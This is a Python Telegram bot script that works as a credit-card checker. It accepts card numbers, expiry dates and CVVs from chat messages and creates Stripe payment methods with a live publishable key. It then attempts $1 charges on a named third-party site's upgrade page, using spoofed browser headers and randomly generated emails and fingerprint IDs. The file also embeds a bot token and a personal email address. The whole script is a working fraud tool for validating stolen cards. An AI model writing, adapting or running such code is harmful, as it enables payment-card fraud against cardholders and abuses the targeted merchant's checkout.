import telebot
import requests
import random
import string
import time

bot = telebot.TeleBot("8072279299:AAH0SaBdoqFOIP-qukCCfvCD7LkqefKlu9Q")

def generate_random_string(length=10):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Send details in format:\nCC|MES|ANO|CVV")

@bot.message_handler(func=lambda message: True)
def handle_card_details(message):
    try:
        # Validate input format
        if not message.text.count("|") == 3:
            raise ValueError("Invalid input format")
            
        cc, mes, ano, cvv = message.text.split('|')
        
        # Generate random identifiers
        email = f"{generate_random_string()}@gmail.com"
        guid = f"{generate_random_string(32)}-{generate_random_string(4)}"
        muid = f"{generate_random_string(32)}"
        sid = f"{generate_random_string(32)}"

        # Stripe Payment Method Request
        pm_data = {
            "type": "card",
            "billing_details[email]": "peshangdev@gmail.com",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "pasted_fields": "number",
            "payment_user_agent": "stripe.js/d991d0758e; stripe-js-v3/d991d0758e; card-element",
            "key": "pk_live_51IekcQKHPFAlBzyyGNBguT5BEI7NEBqrTxJhsYN1FI1lQb9iWxU5U2OXfi744NEMx5p7EDXh08YXrudrZkkG9bGc00ZCrkXrxL"
        }

        pm_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        pm_response = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=pm_headers,
            data=pm_data
        )

        if not pm_response.json().get('id'):
            bot.reply_to(message, "❌ Payment Method Failed")
            return
            
        pm_id = pm_response.json()['id']
        
        # Upgrade Request
        time.sleep(5)
        upgrade_data = {
            "email": email,
            "force_three_d_secure": "false",
            "price_id": "c5106d42-b50c-440e-8a4e-fafeb2691893",
            "payment_method": pm_id,
            "amount_cents": "100"
        }

        upgrade_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "Origin": "https://www.residenturbanist.com",
            "Referer": "https://www.residenturbanist.com/upgrade"
        }

        upgrade_response = requests.post(
            "https://www.residenturbanist.com/upgrade?_data=routes%2Fupgrade",
            headers=upgrade_headers,
            data=upgrade_data
        )

        if upgrade_response.json().get('status') == 'success':
            bot.reply_to(message, "✅ Transaction Successful")
        else:
            bot.reply_to(message, f"❌ Upgrade Failed: {upgrade_response.text}")

    except Exception as e:
        bot.reply_to(message, f"⚠️ Processing Error: {str(e)}")

if __name__ == "__main__":
    bot.polling()